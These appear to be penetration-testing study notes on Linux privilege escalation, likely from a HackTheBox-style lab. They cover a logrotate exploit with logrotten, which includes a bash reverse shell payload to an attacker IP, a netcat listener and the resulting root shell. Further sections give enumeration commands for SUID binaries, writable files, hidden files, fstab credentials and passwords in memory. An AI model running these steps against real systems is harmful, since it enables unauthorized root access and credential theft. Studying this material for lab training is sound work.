Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, `logrotate` has been developed. The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions. Almost more important are the unnoticed system details, such as whether all services are running correctly.

Logrotate is a tool which is usually started periodically via cron and controlled via the configuration file /etc/logrotate.conf. Within this file, it contains global settings that determine the function of logrotate.

```shell-session
cyberslut@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

```shell-session
cyberslut@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```shell-session
cyberslut@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
cyberslut@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function. After that, we have to start a listener on our VM, which waits for the target system's connection.

```shell-session
cyberslut@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```

Unmounted File Systems and Additional Drives: we can take a look at the drives and any shares on the system. We can use the lsblk command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.). If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged for privesc

```shell-session
cyberslut@htb[/htb]$ lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   30G  0 disk 
├─sda1   8:1    0   29G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1  848M  0 rom  
```

The command `lpstat` can be used to find information about any printers attached to the system. If there are active or queued print jobs can we gain access to some sort of sensitive information?

We should also checked for mounted drives and unmounted drives. Can we mount an unmounted drive and gain access to sensitive data? Can we find any types of credentials in `fstab` for mounted drives by greping for common words such as password, username, credential, etc in `/etc/fstab`? 

Mounted File Systems - A mounted file system is a file system that is attached to a particular directory on the system and accessed through that directory. We may have access to such file systems and may find sensitive information, documentation, or applications there.

```shell-session
cyberslut@htb[/htb]$ df -h

Filesystem      Size  Used Avail Use% Mounted on
udev            1,9G     0  1,9G   0% /dev
tmpfs           389M  1,8M  388M   1% /run
/dev/sda5        20G  7,9G   11G  44% /
tmpfs           1,9G     0  1,9G   0% /dev/shm
tmpfs           5,0M  4,0K  5,0M   1% /run/lock
tmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup
/dev/loop0      128K  128K     0 100% /snap/bare/5
/dev/loop1       62M   62M     0 100% /snap/core20/1611
/dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535
/dev/loop4       55M   55M     0 100% /snap/snap-store/558
/dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115
/dev/loop5       47M   47M     0 100% /snap/snapd/16292
/dev/sda1       511M  4,0K  511M   1% /boot/efi
tmpfs           389M   24K  389M   1% /run/user/1000
/dev/sr0        3,6G  3,6G     0 100% /media/cyberslut/Ubuntu 20.04.5 LTS amd64
/dev/loop6       50M   50M     0 100% /snap/snapd/17576
/dev/loop7       64M   64M     0 100% /snap/core20/1695
/dev/loop8       46M   46M     0 100% /snap/snap-store/599
/dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119
```

Unmounted File Systems

```shell-session
cyberslut@htb[/htb]$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
/swapfile                                  none       swap  sw                 0  0
```



- SETUID and SETGID Permissions: The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.

```shell-session
cyberslut@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/cyberslut/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter
-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs
```

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. These files can be leveraged in the same manner as `setuid` binaries to escalate privileges.

```shell-session
cyberslut@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```

- Writeable Directories: if u need to download tools to the system; you may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs ism also writeable

```shell-session
cyberslut@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

/dmz-backups
/tmp
/tmp/VMwareDnD
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/proc
/dev/mqueue
/dev/shm
/var/tmp
/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
/var/crash
/run/lock
```

- Writeable Files: Are there any scripts or conf files world-writeable? Normally, altering conf files can be extremely destructive, but sometimes minor modifications can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.

```shell-session
cyberslut@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>

/home/backupsvc/backup.sh

<SNIP>
```

- Defences: We can also check to see if any defences are in place and we can enumerate any information about them. Some things to look for include (can be skipped in easier CTF envs). Often we will not have the privileges to enumerate the configurations of these protections but knowing what, if any, are in place, can help us not to waste time on certain tasks.:

- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

- Hidden Files and Folders: we need to be able to locate all hidden files and folders bc they can often contain sensitive information, even if we have read-only permissions

All Hidden Files

```shell-session
cyberslut@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep cyberslut

-rw-r--r-- 1 cyberslut cyberslut 3771 Nov 27 11:16 /home/cyberslut/.bashrc
-rw-rw-r-- 1 cyberslut cyberslut 180 Nov 27 11:36 /home/cyberslut/.wget-hsts
-rw------- 1 cyberslut cyberslut 387 Nov 27 14:02 /home/cyberslut/.bash_history
-rw-r--r-- 1 cyberslut cyberslut 807 Nov 27 11:16 /home/cyberslut/.profile
-rw-r--r-- 1 cyberslut cyberslut 0 Nov 27 11:31 /home/cyberslut/.sudo_as_admin_successful
-rw-r--r-- 1 cyberslut cyberslut 220 Nov 27 11:16 /home/cyberslut/.bash_logout
-rw-rw-r-- 1 cyberslut cyberslut 162 Nov 28 13:26 /home/cyberslut/.notes
```

All Hidden Directories

```shell-session
cyberslut@htb[/htb]$ find / -type d -name ".*" -ls 2>/dev/null

   684822      4 drwx------   3 cyberslut cyberslut         4096 Nov 28 12:32 /home/cyberslut/.gnupg
   790793      4 drwx------   2 cyberslut cyberslut         4096 Okt 27 11:31 /home/cyberslut/.ssh
   684804      4 drwx------  10 cyberslut cyberslut         4096 Okt 27 11:30 /home/cyberslut/.cache
   790827      4 drwxrwxr-x   8 cyberslut cyberslut         4096 Okt 27 11:32 /home/cyberslut/CVE-2021-3156/.git
   684796      4 drwx------  10 cyberslut cyberslut         4096 Okt 27 11:30 /home/cyberslut/.config
   655426      4 drwxr-xr-x   3 cyberslut cyberslut         4096 Okt 27 11:19 /home/cyberslut/.local
   524808      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.cache
   544027      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.config
   544028      4 drwxr-xr-x   3 gdm         gdm             4096 Aug 31 08:54 /var/lib/gdm3/.local
   524938      4 drwx------   2 colord      colord          4096 Okt 27 11:19 /var/lib/colord/.cache
     1408      2 dr-xr-xr-x   1 cyberslut cyberslut     2048 Aug 31 09:17 /media/cyberslut/Ubuntu\ 20.04.5\ LTS\ amd64/.disk
   280101      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.font-unix
   262364      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.ICE-unix
   262362      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.X11-unix
   280103      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.Test-unix
   262830      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.XIM-unix
   661820      4 drwxr-xr-x   5 root        root            4096 Aug 31 08:55 /usr/lib/modules/5.15.0-46-generic/vdso/.build-id
   666709      4 drwxr-xr-x   5 root        root            4096 Okt 27 11:18 /usr/lib/modules/5.15.0-52-generic/vdso/.build-id
   657527      4 drwxr-xr-x 170 root        root            4096 Aug 31 08:55 /usr/lib/debug/.build-id
```

- In memory passwords:

```shell-session
 strings /dev/mem -n10 | grep -i PASS
```

- Sensitive Files:
  
```shell-session
 locate password | more           
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
...
```
  
- Temporary files: three default folders are intended for temporary files. These folders are visible to all users and can be read. In addition, temporary logs or script output can be found there. Both `/tmp` and `/var/tmp` are used to store data temporarily. However, the key difference is how long the data is stored in these file systems. The data retention time for `/var/tmp` is much longer than that of the `/tmp` directory. By default, all files and data stored in /var/tmp are retained for up to 30 days. In /tmp, on the other hand, the data is automatically deleted after ten days. In addition, all temporary files stored in the `/tmp` directory are deleted immediately when the system is restarted. Therefore, the `/var/tmp` directory is used by programs to store data that must be kept between reboots temporarily.

```shell-session
cyberslut@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm

/dev/shm:
total 0

/tmp:
total 52
-rw------- 1 cyberslut cyberslut     0 Nov 28 12:32 config-err-v8LfEU
drwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store
drwx------ 2 cyberslut cyberslut     4096 Nov 28 12:32 ssh-OKlLKjlc98xh
<SNIP>
drwx------ 2 cyberslut cyberslut     4096 Nov 28 12:37 tracker-extract-files.1000
drwx------ 2 gdm         gdm         4096 Nov 28 12:31 tracker-extract-files.125

/var/tmp:
total 28
drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-ModemManager.service-4Rej9e
...SNIP...
```

IT'S WORTH RUNNING THE linPEAS SCRIPT - https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

